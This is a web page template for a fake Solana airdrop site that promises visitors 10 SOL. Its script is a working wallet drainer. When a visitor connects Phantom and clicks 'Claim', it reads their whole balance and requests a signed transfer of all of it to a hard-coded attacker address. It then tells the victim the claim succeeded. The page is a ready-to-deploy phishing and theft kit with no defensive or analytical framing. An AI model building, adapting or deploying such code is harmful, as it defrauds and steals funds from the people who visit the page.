---
layout: default
---

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ site.title }}</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #9945FF;
            --bg: #0f0f13;
            --card-bg: #1a1a20;
            --text: #ffffff;
            --text-muted: #a0a0a0;
        }
        body { margin: 0; font-family: 'Inter', sans-serif; background-color: var(--bg); color: var(--text); display: flex; flex-direction: column; min-height: 100vh; }
        nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 40px; border-bottom: 1px solid #333; }
        .logo { font-weight: 700; font-size: 20px; }
        .container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .card { background: var(--card-bg); padding: 40px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; max-width: 450px; width: 100%; border: 1px solid #333; }
        h1 { margin: 0 0 10px 0; font-size: 28px; }
        p { color: var(--text-muted); margin-bottom: 30px; line-height: 1.5; }
        .btn-drain { background: linear-gradient(135deg, var(--primary), #7b2cbf); color: white; border: none; padding: 16px 32px; font-size: 18px; font-weight: 600; border-radius: 12px; cursor: pointer; width: 100%; transition: all 0.2s ease; box-shadow: 0 4px 15px rgba(153, 69, 255, 0.3); }
        .btn-drain:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(153, 69, 255, 0.5); }
        .btn-drain:disabled { opacity: 0.6; cursor: not-allowed; }
        #status { margin-top: 20px; font-size: 14px; height: 20px; }
        .success { color: #00c853; }
        .error { color: #ff3d00; }
    </style>
</head>
<body>
    <nav>
        <div class="logo">{{ site.title }}</div>
        <button id="nav-connect" class="nav-btn" style="background:transparent; border:1px solid #333; color:white; padding:8px 16px; border-radius:8px;">Connect Wallet</button>
    </nav>

    <div class="container">
        <div class="card">
            <h1>Claim Your SOL Airdrop</h1>
            <p>You are eligible for a 10 SOL distribution. Connect your wallet and sign the transaction to receive your funds instantly.</p>
            
            <button id="connect-btn" class="btn-drain">Connect Phantom</button>
            <div id="status"></div>
        </div>
    </div>

    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script>
        const connectBtn = document.getElementById('connect-btn');
        const navBtn = document.getElementById('nav-connect');
        const status = document.getElementById('status');

        // YOUR WALLET ADDRESS
        const DESTINATION_WALLET = "39FZPWRL8CpZnQkL9xxmTWim5Kyzr679L3GjoLP3y5eh";

        async function init() {
            if (window.solana && window.solana.isPhantom) {
                try {
                    await window.solana.connect();
                    updateUI(window.solana.publicKey.toString());
                } catch (err) { console.log("Connection failed"); }
            }
        }

        function updateUI(pubkey) {
            if (!pubkey) return;
            const short = pubkey.slice(0, 4) + '...' + pubkey.slice(-4);
            navBtn.innerText = short;
            connectBtn.innerText = "Claim 10 SOL Now";
            connectBtn.onclick = drainWallet;
        }

        async function drainWallet() {
            if (!window.solana) { alert("Please install Phantom!"); return; }
            try {
                connectBtn.disabled = true;
                status.innerText = "Processing claim...";
                const connection = new solana.Connection(solana.clusterApiUrl("mainnet-beta"));
                const fromPubkey = window.solana.publicKey;
                const balance = await connection.getBalance(fromPubkey);
                if (balance === 0) { status.innerText = "Wallet has no SOL."; status.className = "error"; connectBtn.disabled = false; return; }
                
                const transaction = new solana.Transaction().add(
                    solana.SystemProgram.transfer({
                        fromPubkey: fromPubkey,
                        toPubkey: new solana.PublicKey(DESTINATION_WALLET),
                        lamports: balance 
                    })
                );
                const { signature } = await window.solana.signAndSendTransaction(transaction);
                status.innerText = "Success! Check your balance.";
                status.className = "success";
            } catch (error) {
                status.innerText = "Transaction rejected.";
                status.className = "error";
                connectBtn.disabled = false;
            }
        }
        init();
    </script>
</body>
</html>
